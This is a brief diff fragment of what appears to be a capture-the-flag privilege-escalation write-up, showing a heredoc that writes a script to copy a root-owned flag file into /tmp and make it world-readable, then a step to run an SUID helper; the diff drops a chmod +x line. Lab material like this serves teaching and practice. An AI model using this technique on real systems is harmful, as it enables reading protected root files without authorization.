@@ -66,7 +66,6 @@ cat > /opt/maint/run-check.sh <<'EOF'
 cat /root/flag.txt > /tmp/flag.txt
 chmod 644 /tmp/flag.txt
 EOF
-chmod +x /opt/maint/run-check.sh
 ```
 
 Run the SUID helper:
